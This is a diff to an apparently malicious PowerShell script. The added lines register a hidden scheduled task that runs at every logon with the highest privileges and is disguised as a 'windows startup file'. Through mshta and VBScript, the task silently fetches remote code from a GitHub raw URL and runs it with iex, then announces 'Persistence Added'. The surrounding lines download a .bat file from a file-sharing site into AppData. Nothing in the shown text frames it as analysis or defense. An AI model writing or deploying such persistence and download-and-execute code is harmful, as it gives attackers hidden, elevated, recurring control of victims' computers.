@@ -10,6 +10,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
+$task_name = "bENslgamng"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/code/download')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+Write-Host "[!] Persistence Added" -ForegroundColor Green
+
 $url = "https://anonsharing.com/file/db59849be6b5f562/skibiditoilet.bat"
 $outputPath = "$env:appdata\runtime.bat"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
